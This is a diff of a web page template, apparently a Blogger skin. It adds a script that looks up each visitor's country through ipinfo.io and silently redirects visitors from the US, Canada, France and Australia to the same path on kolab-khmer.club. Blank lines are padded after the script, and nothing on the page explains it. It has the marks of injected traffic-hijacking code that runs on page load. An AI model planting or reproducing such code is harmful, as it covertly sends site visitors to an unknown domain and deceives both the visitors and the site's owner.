@@ -54,6 +54,42 @@
 -->
 
 
+
+<script type="text/javascript">
+  
+  $.get("https://ipinfo.io", function (response) {
+      console.log(response.ip);
+      console.log(response.country);
+      geo(response);
+  }, "jsonp");
+
+  function geo(response) {
+    switch (response.country)
+    {
+      case "US": // Redirect is visitor from US
+      case "CA": // Redirect is visitor from CANADA
+      case "FR": // Redirect is visitor from FRANCE
+      case "AU": // Redirect is visitor from Australia
+        window.location.href = window.location.href.replace(window.location.origin,&quot;http://www.kolab-khmer.club&quot;)
+        break;
+      default: 
+        return null;
+    }
+  }
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
 <style id='page-skin-1' type='text/css'><!--
 /*
 ---*****************************
